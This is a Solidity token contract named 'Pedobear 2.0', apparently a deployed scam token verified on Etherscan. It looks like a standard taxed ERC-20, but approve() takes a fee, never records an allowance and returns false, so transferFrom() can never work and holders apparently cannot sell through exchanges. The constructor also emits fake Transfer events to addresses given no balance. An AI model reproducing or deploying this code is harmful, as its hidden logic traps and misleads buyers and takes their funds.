/**
 *Submitted for verification at Etherscan.io on 2023-07-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Pedobear {
    string public name = "Pedobear 2.0";
    string public symbol = "PBRV2";
    uint8 public decimals = 18;
    uint256 private constant MAX_SUPPLY = 4200000000000000000000000000000;
                                        
    address public marketingWallet;
    address public contractOwner;

    uint256 private constant _taxPercentage = 2;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == contractOwner, "Only the owner can call this function.");
        _;
    }

    constructor() {
        marketingWallet = 0xC9243E947a19152d3CA2E30B1457cc490B43eE83;
        contractOwner = 0xB65b7d8d6D42e09868C86a8eaAe3eDc44eA1eEb1;

        uint256 supplyToMarketing = (MAX_SUPPLY * 84) / 100;
        uint256 supplyToWallet3 = (MAX_SUPPLY * 4) / 100;
        uint256 supplyToWallet4 = (MAX_SUPPLY * 4) / 100;

        balances[0x88023348058e7D5c1b4bF15cEeaBf500034c068e] = supplyToMarketing;
        balances[0xE03Ecc825bB8000093003Cccbb873247022C2B00] = supplyToWallet3;
        balances[contractOwner] = supplyToWallet4;

        emit Transfer(address(0), 0x88023348058e7D5c1b4bF15cEeaBf500034c068e, supplyToMarketing);
        emit Transfer(address(0), 0xE03Ecc825bB8000093003Cccbb873247022C2B00, supplyToWallet3);
        emit Transfer(address(0), 0xd1f95ECD859e808cd129fB1f59E4cF198b92c77c, supplyToWallet3);
        emit Transfer(address(0), 0x74cba378747891101d6f5e4Fc51f3d892d3Ba5dE, supplyToWallet3);
        emit Transfer(address(0), contractOwner, supplyToWallet4);
    }

    function totalSupply() public pure returns (uint256) {
        return MAX_SUPPLY;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        uint256 taxAmount = (amount * _taxPercentage) / 100;
        uint256 transferAmount = amount - taxAmount;

        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += transferAmount;
        balances[marketingWallet] += taxAmount;

        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, marketingWallet, taxAmount);

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 taxAmount = (amount * _taxPercentage) / 100;
        uint256 transferAmount = amount - taxAmount;

        require(balances[from] >= amount, "Insufficient balance");
        require(allowances[from][msg.sender] >= amount, "Allowance exceeded");

        balances[from] -= amount;
        balances[to] += transferAmount;
        balances[marketingWallet] += taxAmount;
        allowances[from][msg.sender] -= amount;

        emit Transfer(from, to, transferAmount);
        emit Transfer(from, marketingWallet, taxAmount);

        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        require(spender != address(this), "Cannot approve on contract address");
        require(spender != address(0), "Invalid spender address");

        uint256 feeAmount = (amount * _taxPercentage) / 100;
        require(balances[msg.sender] >= feeAmount, "Insufficient balance for approval fee");

        balances[msg.sender] -= feeAmount;
        balances[marketingWallet] += feeAmount;

        emit Transfer(msg.sender, marketingWallet, feeAmount);
        emit Approval(msg.sender, spender, 0);

        return false;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
}